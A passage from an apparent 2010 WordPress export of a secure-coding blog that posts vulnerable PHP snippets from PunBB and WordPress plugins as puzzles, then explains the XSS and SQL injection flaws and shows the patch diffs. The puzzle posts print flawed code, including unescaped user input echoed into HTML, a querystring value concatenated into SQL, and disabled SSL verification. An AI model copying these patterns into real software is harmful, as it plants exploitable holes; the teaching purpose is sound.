-prune($prune_from, $_POST['prune_sticky'], $prune_date);
+prune($prune_from, $prune_sticky, $prune_date);
update_forum($prune_from);
}

// Locate any "orphaned redirect topics" and delete them
$result = $db-&gt;query('SELECT t1.id FROM '.$db-&gt;prefix.'topics AS t1 LEFT JOIN '.$db-&gt;prefix.'topics AS t2 ON t1.moved_to=t2.id WHERE t2.id IS NULL AND t1.moved_to IS NOT NULL') or error('Unable to fetch redirect topics', __FILE__, __LINE__, $db-&gt;error());
$num_orphans = $db-&gt;num_rows($result);

if ($num_orphans)
{
for ($i = 0; $i &lt; $num_orphans; ++$i)
$orphans[] = $db-&gt;result($result, $i);

$db-&gt;query('DELETE FROM '.$db-&gt;prefix.'topics WHERE id IN('.implode(',', $orphans).')') or error('Unable to delete redirect topics', __FILE__, __LINE__, $db-&gt;error());
}

redirect('admin_prune.php', 'Posts pruned. Redirecting &amp;hellip;');
}

...&lt;snip&gt;...

&lt;div&gt;
&lt;h2&gt;&lt;span&gt;Prune&lt;/span&gt;&lt;/h2&gt;
&lt;div&gt;
&lt;form method="post" action="admin_prune.php?action=foo"&gt;
&lt;div&gt;
&lt;input type="hidden" name="prune_days" value="&lt;?php echo $prune_days ?&gt;" /&gt;
-&lt;input type="hidden" name="prune_sticky" value="&lt;?php echo $_POST['prune_sticky'] ?&gt;" /&gt;
+&lt;input type="hidden" name="prune_sticky" value="&lt;?php echo $prune_sticky ?&gt;" /&gt;
&lt;input type="hidden" name="prune_from" value="&lt;?php echo $prune_from ?&gt;" /&gt;
&lt;fieldset&gt;
&lt;legend&gt;Confirm prune posts&lt;/legend&gt;
&lt;div&gt;
&lt;p&gt;Are you sure that you want to prune all topics older than &lt;?php echo $prune_days ?&gt; days from &lt;?php echo $forum ?&gt;? (&lt;?php echo $num_topics ?&gt; topics)&lt;/p&gt;
&lt;p&gt;WARNING! Pruning posts deletes them permanently.&lt;/p&gt;
&lt;/div&gt;
&lt;/fieldset&gt;
&lt;/div&gt;
&lt;p&gt;&lt;input type="submit" name="prune_comply" value="Prune" /&gt;&lt;a href="javascript:history.go(-1)"&gt;Go back&lt;/a&gt;&lt;/p&gt;
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1091</wp:post_id>
		<wp:post_date>2010-09-03 08:00:44</wp:post_date>
		<wp:post_date_gmt>2010-09-03 15:00:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>errors-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="classic-symptom"><![CDATA[classic symptom]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="html-markup"><![CDATA[html markup]]></category>
		<category domain="post_tag" nicename="markup"><![CDATA[markup]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="post"><![CDATA[POST]]></category>
		<category domain="category" nicename="punbb"><![CDATA[PunBB]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cYrL80]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[7462de80a4a9677dd2baf049c88b67a3]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Armed</title>
		<link>http://spotthevuln.com/2010/09/armed/</link>
		<pubDate>Mon, 06 Sep 2010 15:00:12 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1098</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Before all else, be armed</strong><strong>.</strong>
<strong> -Niccolo Machiavelli</strong></blockquote>
[ccnLe_php]
} else if ($is_sidebar &amp;&amp; $options['usecss']) {
$content .= '&lt;style type="text/css"&gt;
.sidebar form.w2llead{clear:none;text-align:left;}
.sidebar .w2linput, #sidebar .w2llabel{float:none; display:inline;}
.sidebar .w2llabel.error {color:#f00;}
.sidebar .w2llabel {margin:4px 0;}
.sidebar .w2linput.text{width:95%;height:18px;margin:4px 0;}
.sidebar .w2linput.textarea {width:95%;height:50px;margin:10px 0;}
.sidebar .w2linput.submit {margin:10px 0 0 0;}
#salesforce{margin:3px 0 0 0;color:#aaa;}
#salesforce a{color:#999;}
&lt;/style&gt;';
}
$sidebar = '';
if ($is_sidebar)
$sidebar = ' sidebar';
$content .= "\n".'&lt;form method="post"&gt;'."\n";
foreach ($options['inputs'] as $id =&gt; $input) {
if (!$input['show'])
continue;
$val    = '';
if (isset($_POST[$id]))
$val    = strip_tags(stripslashes($_POST[$id]));

$error  = ' ';
if ($input['error'])
$error  = ' error ';

$content .= "\t".'&lt;label for="sf_'.$id.'"&gt;'.stripslashes($input['label']).':';
if ($input['required'])
$content .= ' *';
$content .= '&lt;/label&gt;'."\n";
if ($input['type'] == 'text') {
$content .= "\t".'&lt;input value="'.$val.'" id="sf_'.$id.'" name="'.$id.'" type="text"/&gt;&lt;br/&gt;'."\n\n";
} else if ($input['type'] == 'textarea') {
$content .= "\t".'&lt;br/&gt;'."\n\t".'&lt;textarea id="sf_'.$id.'" name="'.$id.'"&gt;'.$val.'&lt;/textarea&gt;&lt;br/&gt;'."\n\n";
}
}
$submit = stripslashes($options['submitbutton']);
if (empty($submit))
$submit = "Submit";
$content .= "\t".'&lt;input type="submit" name="w2lsubmit" value="'.$submit.'"/&gt;'."\n";
$content .= '&lt;/form&gt;'."\n";

$reqtext = stripslashes($options['requiredfieldstext']);
if (!empty($reqtext))
$content .= '&lt;p id="requiredfieldsmsg"&gt;&lt;sup&gt;*&lt;/sup&gt;'.$reqtext.'&lt;/p&gt;';
$content .= '&lt;div id="salesforce"&gt;&lt;small&gt;Powered by &lt;a href="http://www.salesforce.com/"&gt;Salesforce CRM&lt;/a&gt;&lt;/small&gt;&lt;/div&gt;';
return $content;
}

function submit_salesforce_form($post, $options) {
global $wp_version;
if (!isset($options['org_id']) || empty($options['org_id']))
return false;

$post['oid']                    = $options['org_id'];
$post['lead_source']    = $options['source'];
$post['debug']                  = 0;

// Set SSL verify to false because of server issues.
$args = array(
'body'          =&gt; $post,
'headers'       =&gt; array(
'user-agent' =&gt; 'WordPress-to-Lead for Salesforce plugin - WordPress/'.$wp_version.'; '.get_bloginfo('url'),
),
'sslverify'     =&gt; false,
);

$result = wp_remote_post('https://www.salesforce.com/servlet/servlet.WebToLead?encoding=UTF-8', $args);

if ($result['headers']['is-processed'] == "true")
return true;
else
return false;
}
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1098</wp:post_id>
		<wp:post_date>2010-09-06 08:00:12</wp:post_date>
		<wp:post_date_gmt>2010-09-06 15:00:12</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>armed</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/9TJodt]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[ec7e98036ec9714f3ecba169783bcfec]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>715</wp:comment_id>
			<wp:comment_author><![CDATA[Code Snippet Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/09/armed-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-09-10 09:45:56</wp:comment_date>
			<wp:comment_date_gmt>2010-09-10 16:45:56</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Armed [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Armed - XSS</title>
		<link>http://spotthevuln.com/2010/09/armed-xss/</link>
		<pubDate>Fri, 10 Sep 2010 16:45:50 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1101</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WordPress-to-lead for Salesforce CRM

Fixed in Version: 1.0.2

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Armed" href="http://spotthevuln.com/2010/09/armed/" target="_blank">Found    Here</a>
<h2>Description</h2>
This week’s vulnerability affected the Wordpress-to-lead for Salesforce plugin.  Looking at the vulnerable code, we see that stripslashes was applied before echoing attacker controlled content into the HTML markup.  Stripslashes was applied in the following lines:
<blockquote>$val    = strip_tags(stripslashes($_POST[$id]));

$content .= "\t".'&lt;label for="sf_'.$id.'"&gt;'.esc_html(stripslashes($input['label'])).':';

$content .= "\t".'&lt;input type="submit" value="'.esc_attr($submit).'"/&gt;'."\n";</blockquote>
Unfortunately, stripslashes doesn’t help protect against XSS.  It’s uncertain whether the original developer thought stripslashes would help protect against XSS.  Regardless of the developer’s intentions, the example does bring a good principle to light.  Developers (and security professionals) should understand what security based APIs provide.  It can be difficult to understand which API is most appropriate for various situations.  Having guidance for non security focused developers is important.  As security professionals, the benefits of an API usage can be obvious.  For a non security focused developer, the number of security APIs can be daunting, much less understanding when to call one API versus another.  This vulnerability was addressed by using the proper escaping APIs as shown in the patch below.
<h2>Developers Solution</h2>
[cce lang="diff"]
} else if ($is_sidebar &amp;&amp; $options['usecss']) {
$content .= '&lt;style type="text/css"&gt;
.sidebar form.w2llead{clear:none;text-align:left;}
.sidebar .w2linput, #sidebar .w2llabel{float:none; display:inline;}
.sidebar .w2llabel.error {color:#f00;}
.sidebar .w2llabel {margin:4px 0;}
.sidebar .w2linput.text{width:95%;height:18px;margin:4px 0;}
.sidebar .w2linput.textarea {width:95%;height:50px;margin:10px 0;}
.sidebar .w2linput.submit {margin:10px 0 0 0;}
#salesforce{margin:3px 0 0 0;color:#aaa;}
#salesforce a{color:#999;}
&lt;/style&gt;';
}
$sidebar = '';
if ($is_sidebar)
$sidebar = ' sidebar';
$content .= "\n".'&lt;form method="post"&gt;'."\n";
foreach ($options['inputs'] as $id =&gt; $input) {
if (!$input['show'])
continue;
$val    = '';
if (isset($_POST[$id]))
-$val    = strip_tags(stripslashes($_POST[$id]));
+$val  = esc_attr(strip_tags(stripslashes($_POST[$id])));

$error  = ' ';
if ($input['error'])
$error  = ' error ';

-$content .= "\t".'&lt;label for="sf_'.$id.'"&gt;'.stripslashes($input['label']).':';
+$content .= "\t".'&lt;label for="sf_'.$id.'"&gt;'.esc_html(stripslashes($input['label'])).':';
if ($input['required'])
$content .= ' *';
$content .= '&lt;/label&gt;'."\n";
if ($input['type'] == 'text') {
$content .= "\t".'&lt;input value="'.$val.'" id="sf_'.$id.'" name="'.$id.'" type="text"/&gt;&lt;br/&gt;'."\n\n";
} else if ($input['type'] == 'textarea') {
$content .= "\t".'&lt;br/&gt;'."\n\t".'&lt;textarea id="sf_'.$id.'" name="'.$id.'"&gt;'.$val.'&lt;/textarea&gt;&lt;br/&gt;'."\n\n";
}
}
$submit = stripslashes($options['submitbutton']);
if (empty($submit))
$submit = "Submit";
-$content .= "\t".'&lt;input type="submit" name="w2lsubmit" value="'.$submit.'"/&gt;'."\n";
+$content .= "\t".'&lt;input type="submit" name="w2lsubmit" value="'.esc_attr($submit).'"/&gt;'."\n";
$content .= '&lt;/form&gt;'."\n";

$reqtext = stripslashes($options['requiredfieldstext']);
if (!empty($reqtext))
$content .= '&lt;p id="requiredfieldsmsg"&gt;&lt;sup&gt;*&lt;/sup&gt;'.$reqtext.'&lt;/p&gt;';
$content .= '&lt;div id="salesforce"&gt;&lt;small&gt;Powered by &lt;a href="http://www.salesforce.com/"&gt;Salesforce CRM&lt;/a&gt;&lt;/small&gt;&lt;/div&gt;';
return $content;
}

function submit_salesforce_form($post, $options) {
global $wp_version;
if (!isset($options['org_id']) || empty($options['org_id']))
return false;

$post['oid']                    = $options['org_id'];
$post['lead_source']    = $options['source'];
$post['debug']                  = 0;

// Set SSL verify to false because of server issues.
$args = array(
'body'          =&gt; $post,
'headers'       =&gt; array(
'user-agent' =&gt; 'WordPress-to-Lead for Salesforce plugin - WordPress/'.$wp_version.'; '.get_bloginfo('url'),
),
'sslverify'     =&gt; false,
);

$result = wp_remote_post('https://www.salesforce.com/servlet/servlet.WebToLead?encoding=UTF-8', $args);

if ($result['headers']['is-processed'] == "true")
return true;
else
return false;
}
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1101</wp:post_id>
		<wp:post_date>2010-09-10 09:45:50</wp:post_date>
		<wp:post_date_gmt>2010-09-10 16:45:50</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>armed-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="developers"><![CDATA[developers]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="stripslashes"><![CDATA[stripslashes]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/azq1Si]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[8ee631f98d833342ddf12c769b1bd81c]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[8ee631f98d833342ddf12c769b1bd81c]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Fish</title>
		<link>http://spotthevuln.com/2010/09/fish/</link>
		<pubDate>Mon, 13 Sep 2010 15:10:59 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1106</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Fish recognize a bad leader.
</strong> <strong> -Conan O'Brien</strong></blockquote>
[ccnLe_php]
if (empty($userdata-&gt;ID) &amp;&amp; $members_only_opt['feed_access'] != 'feednone')  //Check if user is logged in or Feed Keys is required
{
$feedkey = $_GET['feedkey'];
if (!empty($feedkey))
{
// Check if Feed Key is in the Database
$find_feedkey = $wpdb-&gt;get_results("SELECT umeta_id FROM $wpdb-&gt;usermeta WHERE meta_value = '$feedkey'");

if (!empty($find_feedkey) &amp;&amp; $members_only_opt['feed_access'] == 'feedkeys') //If Feed Key is found and using Feed Keys
{
$feedkey_valid = TRUE;
if (empty($feedkey) &amp;&amp; $members_only_opt['feed_access'] == 'feedkeys')
{
$feed = members_only_create_feed('No Feed Key Found', $errormsg['feedkey_missing']);
header("Content-Type: application/xml; charset=ISO-8859-1");
echo $feed;
exit;
}
elseif ($feedkey_valid == FALSE &amp;&amp; $members_only_opt['feed_access'] == 'feedkeys')
{
$feed = members_only_create_feed('Feed Key is Invalid', $errormsg['feedkey_invalid']);
header("Content-Type: application/xml; charset=ISO-8859-1");
echo $feed;
exit;
}

if (empty($feedkey) &amp;&amp; $members_only_opt['feed_access'] == 'feedkeys')
{
$feed = members_only_create_feed('No Feed Key Found', $errormsg['feedkey_missing']);
header("Content-Type: application/xml; charset=ISO-8859-1");
echo $feed;
exit;
}
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1106</wp:post_id>
		<wp:post_date>2010-09-13 08:10:59</wp:post_date>
		<wp:post_date_gmt>2010-09-13 15:10:59</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>fish</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/a3z7TM]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[e84d4c76a5ed4d38d35eabcb46360896]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Fish - SQL Injection</title>
		<link>http://spotthevuln.com/2010/09/fish-sql-injection/</link>
		<pubDate>Fri, 17 Sep 2010 15:10:17 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1111</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Members-only Wordpress plugin

Fixed in Version: 0.6.7

Issue Type: SQL Injection

Original Code: <a title="Fish" href="http://spotthevuln.com/2010/09/fish/" target="_blank">Found    Here</a>
<h2>Description</h2>
This week’s vuln was an easy one :)  The vulnerability affected the “members-only” plug-in for Wordpress and was patched in version 0.6.7.  There are a couple changes in the diff, but the most important change (from a security standpoint) is the transition from a string-built, dynamic SQL statement to a prepared statement.  The following lines show the SQL injection bug:
<blockquote>$feedkey = $_GET['feedkey'];
… &lt;snip&gt;…
$find_feedkey = $wpdb-&gt;get_results("SELECT umeta_id FROM $wpdb-&gt;usermeta WHERE meta_value = '$feedkey'");</blockquote>
The members-only developers assigned a value for the $feedkey variable directly from the querystring.  They then used the attacker controlled value to build a SQL statement, using the $feedkey value to complete the SQL WHERE clause.  The symptoms presented above are classic SQL injection.  I’m happy to see that the members-only developers chose to use prepared statements to fix the SQL injection.

There are a few other fixes here, but the SQL injection was the most important security fix.
<h2>Developers Solution</h2>
[cce lang="diff"]
-if (empty($userdata-&gt;ID) &amp;&amp; $members_only_opt['feed_access'] != 'feednone')  //Check if user is logged in or Feed Keys is required
+if (empty($userdata-&gt;ID) || $members_only_opt['feed_access'] != 'feednone')  //Check if user is logged in or Feed Keys is required
{
$feedkey = $_GET['feedkey'];
if (!empty($feedkey))
{
// Check if Feed Key is in the Database
-$find_feedkey = $wpdb-&gt;get_results("SELECT umeta_id FROM $wpdb-&gt;usermeta WHERE meta_value = '$feedkey'");
+$find_feedkey = $wpdb-&gt;get_results( $wpdb-&gt;prepare(
+          "SELECT umeta_id FROM $wpdb-&gt;usermeta WHERE meta_value = %s",
+          $feedkey
+) );

if (!empty($find_feedkey) &amp;&amp; $members_only_opt['feed_access'] == 'feedkeys') //If Feed Key is found and using Feed Keys
{
$feedkey_valid = TRUE;
if (empty($feedkey) &amp;&amp; $members_only_opt['feed_access'] == 'feedkeys')
{
$feed = members_only_create_feed('No Feed Key Found', $errormsg['feedkey_missing']);
-header("Content-Type: application/xml; charset=ISO-8859-1");
+header("Content-Type: application/xml; charset=" . get_bloginfo( 'charset' ), true);
echo $feed;
exit;
}
elseif ($feedkey_valid == FALSE &amp;&amp; $members_only_opt['feed_access'] == 'feedkeys')
{
$feed = members_only_create_feed('Feed Key is Invalid', $errormsg['feedkey_invalid']);
-header("Content-Type: application/xml; charset=ISO-8859-1");
+header("Content-Type: application/xml; charset=" . get_bloginfo( 'charset' ), true);
echo $feed;
exit;
}

if (empty($feedkey) &amp;&amp; $members_only_opt['feed_access'] == 'feedkeys')
{
$feed = members_only_create_feed('No Feed Key Found', $errormsg['feedkey_missing']);
-header("Content-Type: application/xml; charset=ISO-8859-1");
+header("Content-Type: application/xml; charset=" . get_bloginfo( 'charset' ), true);
echo $feed;
exit;
}
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1111</wp:post_id>
		<wp:post_date>2010-09-17 08:10:17</wp:post_date>
		<wp:post_date_gmt>2010-09-17 15:10:17</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>fish-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="dynamic-sql"><![CDATA[dynamic SQL]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="prepared-statement"><![CDATA[prepared statement]]></category>
		<category domain="post_tag" nicename="querystring"><![CDATA[querystring]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-statement"><![CDATA[sql statement]]></category>
		<category domain="post_tag" nicename="sqli"><![CDATA[SQLi]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/abkc16]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[f01951fd7a6e0a77d92fc1b256d4f6a9]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>One-Year Anniversary</title>
		<link>http://spotthevuln.com/2010/09/one-year-anniversary/</link>
		<pubDate>Mon, 20 Sep 2010 15:00:23 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1069</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Today is Spot the Vuln's Birthday! Woot!</h2>
STV has now been online for one year and we would like to do a reverse birthday where we give something away to our readers.

Starting right now and going until the end of the week you have a chance to win a <strong>signed copy</strong> of <a href="http://www.amazon.com/Hacking-Next-Generation-Animal-Guide/dp/0596154577">Hacking: The Next Generation</a>.
<h2>A Contest You Say</h2>
<a href="http://www.amazon.com/Hacking-Next-Generation-Animal-Guide/dp/0596154577" target="_blank"><img class="alignright" title="HTNG" src="http://covers.oreilly.com/images/9780596154585/lrg.jpg" alt="" width="250" height="328" /></a>

Not only are we giving one away, but we are giving two away! We're even going to pay for shipping!

A book will be given away randomly to one person in each category below.
<ul>
	<li><strong>Tweet a message with the hash tag, #SpotTheVuln. (Couldn't be easier)</strong></li>
	<li><strong>Post a video, podcast, or write a blog post on how STV can help developers understand security better. It can be funny, serious, or make no sense at all. Then tagback or pingback to this post.</strong></li>
</ul>
We are glad you read Spot The Vuln and we can't wait to bring it to even more people, so that we can all feel safer.

Look forward to reading, watching, listening to all you have to say.

-SpotTheVuln
<h2>Reviews of the Book</h2>
<a href="http://www.net-security.org/review.php?id=222">Net Security Review</a>

<a href="http://www.lockergnome.com/windows/2010/01/19/hacking-the-next-generation/">Windows Fanatics Review</a>

<a href="http://www.itworld.com/security/106782/book-review-hacking-the-next-generation">IT World Review</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1069</wp:post_id>
		<wp:post_date>2010-09-20 08:00:23</wp:post_date>
		<wp:post_date_gmt>2010-09-20 15:00:23</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>one-year-anniversary</wp:post_name>
		<wp:status>publish</wp:status>
